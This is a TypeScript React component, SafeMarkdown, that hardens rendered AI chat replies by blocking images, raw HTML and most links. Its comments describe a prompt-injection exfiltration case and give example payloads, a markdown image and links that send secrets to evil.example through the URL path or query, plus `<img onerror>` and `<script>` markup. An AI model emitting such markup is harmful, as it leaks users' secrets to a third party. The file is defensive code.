import { use } from 'react'
import type { ReactNode } from 'react'
import { Streamdown } from 'streamdown'
import type { StreamdownProps } from 'streamdown'

import { cn } from '../lib/utils.js'
import { TrustedHostsContext, isHostIn, isTrustedHost } from './trusted-hosts.js'

export type SafeMarkdownProps = Omit<StreamdownProps, 'children'> & {
  content?: string
  /** The consumer's own hosts (`toSafeLink`); else the surrounding `TrustedHostsContext`, empty by default. */
  trustedHosts?: readonly string[]
}

/**
 * Streamdown with the hardening it ships switched off put back (streamdown 1.6 runs `rehype-harden`
 * with `allowedImagePrefixes`/`allowedLinkPrefixes`/`allowedProtocols: ["*"]` and
 * `allowDataImages: true`). A reply can carry text the model read from the web, so a prompt-injected
 * `![](https://evil.example/?d=<secret>)` would otherwise be fetched by the browser the moment it
 * renders. Images (markdown and raw `<img>`/`<source>`) never render, and a link is a link only for
 * `https:` and `mailto:`; anything else keeps its text and loses its target (`toSafeLink` says what
 * else a link loses on the way). Raw HTML in the markdown
 * (`<img onerror>`, `<script>`) never becomes markup: Streamdown turns `allowDangerousHtml` on and
 * re-parses it with rehype-raw, and with it off remark-rehype drops the raw nodes first. The overrides
 * are applied last, so a caller's `components` or `remarkRehypeOptions` cannot re-open them.
 *
 * Kept free of CopilotKit so a page that only shows markdown does not pull the chat bundle in.
 */
export const SafeMarkdown = (props: SafeMarkdownProps) => {
  const { content, trustedHosts, ...rest } = props

  const markdown = (
    <Streamdown {...rest} components={SAFE_COMPONENTS} remarkRehypeOptions={NO_RAW_HTML}>
      {content ?? ''}
    </Streamdown>
  )

  if (trustedHosts === undefined) return markdown

  return <TrustedHostsContext value={trustedHosts}>{markdown}</TrustedHostsContext>
}

interface SafeLinkProps {
  href?: string
  title?: string
  className?: string
  children?: ReactNode
}

// Streamdown's own link markup (`MarkdownA`), so an allowed link looks unchanged.
const SafeLink = (props: SafeLinkProps) => {
  const { href, title, className, children } = props

  const trustedHosts = use(TrustedHostsContext)
  const safe = toSafeLink(href, trustedHosts)

  if (!safe) return <span data-streamdown="blocked-link">{children}</span>

  return (
    <>
      <a
        href={safe.href}
        title={title}
        rel="noopener noreferrer nofollow"
        target="_blank"
        data-streamdown="link"
        className={cn('text-primary font-medium wrap-anywhere underline', className)}
      >
        {children}
      </a>
      {safe.host ? (
        <span data-streamdown="link-host" className="text-muted-foreground text-xs">
          {` (${safe.host})`}
        </span>
      ) : null}
    </>
  )
}

interface AllowedLink {
  href: string
  /** Set for a link that leaves the consumer's own hosts, so the reader sees where it goes before following it. */
  host?: string
}

// The path, query string and fragment are where an injected link carries data out
// (`https://evil.example/<secret>`, `?d=<secret>`), so a link to any host but the chains' and the
// consumer's own (`trustedHosts`) goes to that host's origin only; a `mailto:` loses its prefilled
// `?body=` / `?cc=`.
/** The href a reply's link may carry, or `undefined` when it may not be a link at all. */
export const toSafeLink = (
  href: string | undefined,
  trustedHosts: readonly string[] = NO_HOSTS,
): AllowedLink | undefined => {
  if (!isAllowedHref(href)) return undefined

  const url = new URL(href as string)

  if (url.protocol === 'mailto:') {
    url.search = ''
    url.hash = ''

    return { href: url.href }
  }

  const safeHref = isTrustedHost(url.hostname, trustedHosts) ? url.href : `${url.origin}/`

  return isHostIn(url.hostname, trustedHosts) ? { href: safeHref } : { href: safeHref, host: url.hostname }
}

const NO_HOSTS: readonly string[] = []

const NoImage = () => {
  return null
}

const ALLOWED_PROTOCOLS = new Set(['https:', 'mailto:'])

// No base URL on purpose: a relative or protocol-less href does not parse, so it is refused too.
export const isAllowedHref = (href: string | undefined): boolean => {
  if (!href) return false

  try {
    return ALLOWED_PROTOCOLS.has(new URL(href).protocol)
  } catch {
    return false
  }
}

// Module-level: Streamdown memoises its blocks on the `components` identity, and caches its processor
// per `remarkRehypeOptions` object.
export const SAFE_COMPONENTS: StreamdownProps['components'] = { a: SafeLink, img: NoImage, source: NoImage }

export const NO_RAW_HTML: StreamdownProps['remarkRehypeOptions'] = { allowDangerousHtml: false }
